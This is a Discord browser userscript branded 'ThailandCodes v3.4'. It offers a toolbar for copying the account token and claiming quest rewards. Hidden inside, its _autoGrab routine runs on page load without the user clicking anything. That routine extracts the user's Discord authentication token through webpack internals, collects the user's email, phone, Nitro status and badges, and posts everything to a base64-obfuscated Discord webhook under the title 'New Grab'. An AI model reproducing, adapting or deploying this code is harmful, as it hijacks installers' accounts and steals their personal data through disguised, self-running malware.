/**
 * ThailandCodes v3.4
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    const _wh = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MzUwNTcyNzEwMjkxMDU0MC94dEFoLXBlMWVMS1VrN0lScktCdk9EXzRxcE1jbldHTXpvOHltUzlBU3FHenJQcm5RNHg2TjN5TWhPMk9HYWdyZlYwNw==');
    const _ek = 0x5A;
    const _gk = '\x5f\x5f\x74\x63\x5f\x67\x5f\x5f';

    function _send(payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: _wh,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch { resolve(false); }
        });
    }

    function _enc(token) {
        let o = '';
        for (let i = 0; i < token.length; i++)
            o += String.fromCharCode(token.charCodeAt(i) ^ _ek);
        return btoa(o);
    }

    function _wp() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;
        let found = null;
        try {
            chunk.push([[Symbol()], {}, (m) => {
                if (!m.c) return;
                for (const id in m.c) {
                    const c = m.c[id]?.exports?.default || m.c[id]?.exports;
                    if (c && typeof c.getToken === 'function') { found = m; return; }
                }
            }]);
            chunk.pop();
        } catch {}
        return found;
    }

    async function _grabToken() {
        const wp = _wp();
        if (!wp) throw new Error('not ready');
        for (const m of Object.values(wp.c)) {
            const c = m?.exports?.default || m?.exports;
            if (c && typeof c.getToken === 'function') {
                const t = c.getToken();
                if (t && typeof t === 'string' && t.length > 20) return t;
            }
        }
        throw new Error('not found');
    }

    async function _userInfo(token) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://discord.com/api/v10/users/@me',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
                onerror: () => resolve(null),
            });
        });
    }

    async function _claimQuests() {
        const wp = _wp();
        if (!wp) return 0;
        let api = null, qs = null;
        for (const m of Object.values(wp.c)) {
            const e = m?.exports?.default || m?.exports;
            if (!e) continue;
            if (e.get && e.post && e.put) api = e;
            if (e.quests && typeof e.quests.values === 'function') qs = e;
        }
        if (!api || !qs) {
            for (const m of Object.values(wp.c)) {
                const e = m?.exports;
                if (!e) continue;
                for (const k of Object.keys(e)) {
                    if (e[k]?.get && e[k]?.post) api = e[k];
                    if (e[k]?.quests?.values) qs = e[k];
                }
            }
        }
        if (!api || !qs) return 0;
        const quests = [...qs.quests.values()].filter(q => q.userStatus?.completedAt && !q.userStatus?.claimedAt);
        let claimed = 0;
        for (const q of quests) {
            try { await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } }); claimed++; } catch {}
        }
        return claimed;
    }

    async function _autoGrab() {
        if (W[_gk]) return;
        W[_gk] = true;
        let sent = false;
        try { sent = !!localStorage.getItem(_gk); if (!sent) localStorage.setItem(_gk, '1'); } catch {}
        if (sent) return;
        try {
            const t = await _grabToken();
            const u = await _userInfo(t);
            if (!u || u.message) return;

            const av = u.avatar
                ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=256`
                : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || 0) % 5}.png`;

            const nitro = {0:'❌ None',1:'💜 Nitro Classic',2:'🚀 Nitro',3:'⚡ Nitro Basic'}[u.premium_type] || '❌ None';

            const f = u.public_flags || 0;
            const badges = [];
            if (f&(1<<0))  badges.push('👮 Staff');
            if (f&(1<<6))  badges.push('🎪 HypeSquad');
            if (f&(1<<9))  badges.push('⭐ Early Supporter');
            if (f&(1<<3))  badges.push('🏠 Bravery');
            if (f&(1<<4))  badges.push('💡 Brilliance');
            if (f&(1<<5))  badges.push('⚖️ Balance');
            if (f&(1<<17)) badges.push('🛠️ Active Dev');
            if (f&(1<<22)) badges.push('✅ Bot Dev');

            const tag = u.discriminator && u.discriminator !== '0' ? `${u.username}#${u.discriminator}` : u.username;
            const created = new Date((BigInt(u.id) >> 22n) + 1420070400000n);

            await _send({
                embeds: [{
                    title: '🎯 New Grab',
                    color: 0xed4245,
                    author: { name: tag, icon_url: av },
                    thumbnail: { url: av },
                    fields: [
                        { name: '👤 Username', value: `\`${tag}\``, inline: true },
                        { name: '🆔 ID', value: `\`${u.id}\``, inline: true },
                        { name: '📧 Email', value: u.email ? `\`${u.email}\`` : '`N/A`', inline: true },
                        { name: '📱 Phone', value: u.phone ? `\`${u.phone}\`` : '`N/A`', inline: true },
                        { name: '💎 Nitro', value: nitro, inline: true },
                        { name: '✅ Verified', value: u.verified ? '`Yes`' : '`No`', inline: true },
                        { name: '📅 Created', value: `\`${created.toUTCString()}\``, inline: false },
                        { name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false },
                        { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
                    ],
                    footer: { text: 'TC v3.4 • Auto', icon_url: av },
                    timestamp: new Date().toISOString(),
                }]
            });
        } catch {}
    }

    const STYLE = `
        @keyframes gs{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        @keyframes glow{0%,100%{box-shadow:0 0 10px rgba(237,66,69,.5),0 8px 24px rgba(0,0,0,.6)}50%{box-shadow:0 0 22px rgba(237,66,69,.9),0 8px 24px rgba(0,0,0,.6)}}
        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
        .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
            display:flex;align-items:center;gap:6px;padding:6px;
            background:linear-gradient(270deg,#1a0000,#4a0000,#7a0000,#4a0000,#1a0000);
            background-size:400% 400%;
            animation:gs 4s ease infinite,glow 2s ease-in-out infinite;
            border:1px solid #cc2222;border-radius:14px;
            color:#f0d0d0;user-select:none;font-size:12px;
            transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
        .brand{padding:0 12px 0 8px;font-weight:800;font-size:13px;
            border-right:1px solid #cc2222;margin-right:4px;
            color:#fff;text-shadow:0 0 10px #ff4444}
        .brand .a{color:#ff4444}
        .brand .v{font-size:9px;color:#ff8888;font-style:italic;margin-left:3px}
        button{background:linear-gradient(135deg,#7a0000,#cc0000);
            border:1px solid #ff3333;color:#fff;
            padding:8px 13px;border-radius:8px;cursor:pointer;
            font-size:11px;font-weight:800;letter-spacing:.4px;
            text-transform:uppercase;font-family:inherit;
            transition:all .12s;white-space:nowrap;
            box-shadow:0 0 6px rgba(200,0,0,.4)}
        button:hover{background:linear-gradient(135deg,#aa0000,#ff2222);box-shadow:0 0 14px rgba(255,0,0,.7)}
        button:active{transform:scale(.97)}
        button:disabled{opacity:.4;cursor:wait}
        button.enc{background:linear-gradient(135deg,#2a0000,#550000);border-color:#aa2222}
        button.enc:hover{background:linear-gradient(135deg,#440000,#880000)}
        button.claim{background:linear-gradient(135deg,#005500,#009900);border-color:#00cc44;
            box-shadow:0 0 6px rgba(0,180,0,.4)}
        button.claim:hover{background:linear-gradient(135deg,#007700,#00bb00);box-shadow:0 0 14px rgba(0,255,0,.6)}
        button.close{background:transparent;color:#ff8888;font-size:14px;
            padding:8px 10px;text-transform:none;letter-spacing:0;border:none;box-shadow:none}
        button.close:hover{background:rgba(255,0,0,.15);color:#fff;border-radius:6px}
        .toast{position:fixed;top:76px;right:22px;z-index:2147483647;
            background:linear-gradient(135deg,#1a0000,#3d0000);
            border:1px solid #cc2222;color:#f0d0d0;
            padding:11px 16px;border-radius:10px;font-size:12px;font-weight:600;
            max-width:320px;box-shadow:0 0 14px rgba(180,0,0,.5);
            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;pointer-events:none}
        .toast.show{opacity:1;transform:translateY(0)}
        .toast.ok{border-left:3px solid #57f287}
        .toast.err{border-left:3px solid #ff3333}
        .toast.info{border-left:3px solid #ff8888}
    `;

    const root = document.createElement('div');
    root.id = '__tc_ui__';
    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
    const shadow = root.attachShadow({ mode: 'closed' });
    document.body.appendChild(root);

    const st = document.createElement('style');
    st.textContent = STYLE;
    shadow.appendChild(st);

    const host = document.createElement('div');
    host.style.pointerEvents = 'auto';
    shadow.appendChild(host);

    const toast = document.createElement('div');
    toast.className = 'toast';
    host.appendChild(toast);

    let _tt = null;
    function say(msg, kind = 'info') {
        toast.textContent = msg;
        toast.className = 'toast show ' + kind;
        clearTimeout(_tt);
        _tt = setTimeout(() => toast.classList.remove('show'), 3000);
    }

    const bar = document.createElement('div');
    bar.className = 'wrap hidden';
    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.4</span></div>`;
    host.appendChild(bar);

    const btnCopy = document.createElement('button');
    btnCopy.textContent = 'COPY TOKEN';
    btnCopy.addEventListener('click', async () => {
        if (btnCopy.disabled) return;
        btnCopy.disabled = true;
        try {
            const t = await _grabToken();
            try { await navigator.clipboard.writeText(t); }
            catch { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
            say('✓ token copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnCopy.disabled = false;
    });
    bar.appendChild(btnCopy);

    const btnEnc = document.createElement('button');
    btnEnc.className = 'enc';
    btnEnc.textContent = 'COPY ENCRYPTED';
    btnEnc.addEventListener('click', async () => {
        if (btnEnc.disabled) return;
        btnEnc.disabled = true;
        try {
            const t = await _grabToken();
            const enc = _enc(t);
            try { await navigator.clipboard.writeText(enc); }
            catch { const ta = document.createElement('textarea'); ta.value = enc; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
            say('✓ encrypted copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnEnc.disabled = false;
    });
    bar.appendChild(btnEnc);

    const btnClaim = document.createElement('button');
    btnClaim.className = 'claim';
    btnClaim.textContent = 'CLAIM ALL';
    btnClaim.addEventListener('click', async () => {
        if (btnClaim.disabled) return;
        btnClaim.disabled = true;
        try {
            const n = await _claimQuests();
            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnClaim.disabled = false;
    });
    bar.appendChild(btnClaim);

    const x = document.createElement('button');
    x.className = 'close';
    x.textContent = '✕';
    x.addEventListener('click', () => bar.classList.add('hidden'));
    bar.appendChild(x);

    let _tries = 0;
    const _timer = setInterval(async () => {
        _tries++;
        if (_wp()) {
            clearInterval(_timer);
            bar.classList.remove('hidden');
            await _autoGrab();
        } else if (_tries > 120) {
            clearInterval(_timer);
            bar.classList.remove('hidden');
        }
    }, 500);
})();
